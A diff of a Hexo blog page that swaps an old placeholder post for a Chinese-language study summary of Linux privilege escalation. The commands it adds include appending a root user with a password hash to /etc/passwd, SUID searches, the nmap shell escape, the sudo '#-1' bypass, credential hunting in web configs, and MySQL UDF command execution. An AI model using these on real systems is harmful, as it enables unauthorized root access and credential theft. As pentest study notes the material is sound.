@@ -11,7 +11,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title>MEADME |  Jw5t</title>
+      <title>提权总结 |  Jw5t</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="http://tva1.sinaimg.cn/large/007axxUTgy1gvl7m2su1sj60hs0hswg402.jpg" />
@@ -54,7 +54,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-换电脑重装事宜"
+  id="post-提权总结"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -65,7 +65,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  MEADME
+  提权总结
 </h1>
  
 
@@ -73,15 +73,19 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2018/05/26/%E6%8D%A2%E7%94%B5%E8%84%91%E9%87%8D%E8%A3%85%E4%BA%8B%E5%AE%9C/" class="article-date">
-  <time datetime="2018-05-26T04:12:57.000Z" itemprop="datePublished">2018-05-26</time>
-</a>   
+      <a href="/2022/03/19/%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/" class="article-date">
+  <time datetime="2022-03-19T04:12:57.000Z" itemprop="datePublished">2022-03-19</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/web/">web</a>
+  </div>
+  
 <div class="word_count">
     <span class="post-time">
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">18</span>
+            <span class="post-count">892</span>
         </span>
     </span>
 
@@ -90,7 +94,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">1 分钟</span>
+            <span class="post-count">3 分钟</span>
         </span>
     </span>
 </div>
@@ -105,9 +109,115 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <h1 id="MEADME"><a href="#MEADME" class="headerlink" title="MEADME"></a>MEADME</h1><p>换了电脑，之前博客莫得备份</p>
-<p>重新开始吧</p>
- 
+  <h1 id="linux提权"><a href="#linux提权" class="headerlink" title="linux提权"></a>linux提权</h1><ol>
+<li><p><strong>etc/passwd 提权</strong></p>
+<ol>
+<li>若该文件可写，则添加root用户</li>
+<li>如该文件可读，则用john爆破</li>
+</ol>
+</li>
+<li><p><strong>etc/shadow提权</strong></p>
+<ol>
+<li><p>若该文件可写，则添加root用户</p>
+<ol>
+<li><p>```<br>echo ‘syl-passwd:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash’ &gt;&gt; /etc/passwd</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">   </span><br><span class="line">   2. 如该文件可读，则用john爆破</span><br><span class="line">   </span><br><span class="line">3. **suid**</span><br><span class="line"></span><br><span class="line">   ​	我们可以使用如下命令来查找主机上所有具有 `s` 权限的可执行文件：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>find / -user root -perm -4000 -print 2&gt;/dev/null<br>find / -perm -u=s -type f 2&gt;/dev/null<br>find / -user root -perm -4000 -exec ls -ldb {} ;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ls -alh 应用 ，看权限 有没有s</span><br><span class="line"></span><br><span class="line">1. nmap `2.02~5.21`</span><br><span class="line"></span><br><span class="line">   1. ```bash</span><br><span class="line">      nmap --interactive 后!sh	</span><br></pre></td></tr></table></figure>
+
+<p>如果用namp反弹shell 就不是root  所以反弹shell 不一定是最好的</p>
+</li>
+</ol>
+</li>
+<li><p>find      <code>find &lt;file&gt; -exec &lt;command&gt; \;</code></p>
+</li>
+<li><p>cp和mv ，覆盖passwd shadow</p>
+</li>
+<li><p>cat</p>
+</li>
+<li><p>vim</p>
+</li>
+<li><p>more</p>
+</li>
+<li><p>sed</p>
+</li>
+</ol>
+<p>和sudo提权区别，这个是在执行时有了root权限，而sudo提权是本来就是那个权限，只不过让普通用户能用</p>
+</li>
+<li><p><strong>CronJobs定时任务提权</strong></p>
+<p>root权限，普通命令执行</p>
+<p>​    1.反弹shell</p>
+<p>​    2.进行suid提权</p>
+</li>
+<li><p><strong>通配符注入提权</strong></p>
+<p>对 Linux 有一定了解的同学应该会知道通配符，通配符是一个字符或一组字符，可以用来替换某些范围/类别的字符。</p>
+<p>下面是一些常见的通配符：</p>
+<ul>
+<li><p><code>*</code> 星号可以与文件名中的任意数量的字符匹配，包括 0 个字符。</p>
+</li>
+<li><p><code>?</code> 问号用于匹配任意单个字符。</p>
+</li>
+<li><p><code>[]</code> 括号内包括一组字符，其中任何一个字符都可以匹配该位置上的单个字符。</p>
+</li>
+<li><p><code>~</code> 单词开头的波浪符表示当前用户的主目录的名称。如果该字符后面是另一个用户的登录名，则表示该用户的主目录。</p>
+<p><em><strong>条件</strong></em></p>
+</li>
+</ul>
+<p>​    <strong>那个目录有写入权限，且命令不包含绝对路径</strong></p>
+</li>
+<li><p><strong>sudo提权</strong></p>
+<p>sudoers 文件配置错误，将某些文件配置成了全用户可用</p>
+<p>就比如说find  nmap 一类的</p>
+<p>命令在将 UID 转换为对应用户时，会将 -1 或 4294967295 这两个异常数字视为 0，而 0 是 root 用户的 UID。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -u &quot;#-1&quot; whoami</span><br><span class="line">sudo -u &quot;#4294967295&quot; whoami</span><br></pre></td></tr></table></figure></li>
+<li><p><strong>敏感文件提权</strong></p>
+<p>Web 配置文件找数据库账户密码，再用数据库密码找其他密码</p>
+<ul>
+<li><p><code>database.php</code></p>
+</li>
+<li><p><code>user.php</code></p>
+</li>
+<li><p><code>*.config</code></p>
+</li>
+<li><p><code>config.php</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /var/www -type f \( -iname &quot;user.php&quot; -o -iname &quot;database.php&quot; -o -iname &quot;config.php&quot; -o -iname &quot;*.config&quot; \) 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>history</p>
+<p>bash_history</p>
+</li>
+</ul>
+</li>
+<li><p><strong>mysql UDF提权</strong></p>
+<p>mysql 默认目录 /usr/local/mysql</p>
+<p>​    如果版本大于5.1，UDF 的动态链接库文件放置于 MySQL 安装目录下的 lib\plugin 文件夹下文件夹下才能创建自定义函数，sqlmap里面有，要用sqlmap解码过</p>
+<p>把 UDF 的动态链接库文件放到 MySQL 的插件目录，不存在就手工创建 \lib\plugin</p>
+<p>用select   into dumfile 写入文件</p>
+<p>创建自定义的函数</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> sys_eval <span class="keyword">RETURNS</span> STRING SONAME <span class="string">&#x27;udf.dll&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>调用文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sys_eval(<span class="string">&#x27;whoami&#x27;</span>);</span><br></pre></td></tr></table></figure></li>
+</ol>
+<ol>
+<li><p><strong>跳板用户提权</strong></p>
+<p>​    先用其他方式比如说john爆破跳转到其他用户 </p>
+</li>
+<li><p><strong>内核漏洞提权</strong></p>
+<p>uname -r 查找版本  网上查找漏洞</p>
+</li>
+<li><p><strong>暴力破解提权</strong></p>
+<ol>
+<li>通过 su 命令爆破 root 密码</li>
+<li>通过 SSH 协议爆破 root 密码</li>
+</ol>
+</li>
+<li><p><strong>自动化提权工具</strong></p>
+<p>​    LinEnum</p>
+</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/313827604">https://zhuanlan.zhihu.com/p/313827604</a></p>
+<p><a target="_blank" rel="noopener" href="https://shng.fun/posts/2021-01-23-%E5%AD%A6%E4%B9%A0-Linux%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95.html#%E5%8D%81-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%8F%90%E6%9D%83">https://shng.fun/posts/2021-01-23-%E5%AD%A6%E4%B9%A0-Linux%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95.html#%E5%8D%81-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%8F%90%E6%9D%83</a></p>
+<h1 id="windows提权"><a href="#windows提权" class="headerlink" title="windows提权"></a>windows提权</h1> 
       <!-- reward -->
       
       <div id="reword-out">
@@ -177,7 +287,7 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2018/05/26/%E6%8D%A2%E7%94%B5%E8%84%91%E9%87%8D%E8%A3%85%E4%BA%8B%E5%AE%9C/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2022/03/19/%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -188,15 +298,11 @@
    
   <nav class="article-nav">
     
-      <a href="/2019/05/26/windows_Terminal%E7%9A%84ssh%E6%96%B9%E6%B3%95/" class="article-nav-link">
-        <strong class="article-nav-caption">上一篇</strong>
-        <div class="article-nav-title">
-          
-            windows——Terminal的ssh方法
-          
-        </div>
-      </a>
     
+      <a href="/2022/02/27/%E5%90%91%E6%97%A5%E8%91%B5rce/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">向日葵rce复现和原理分析</div>
+      </a>
     
   </nav>
 
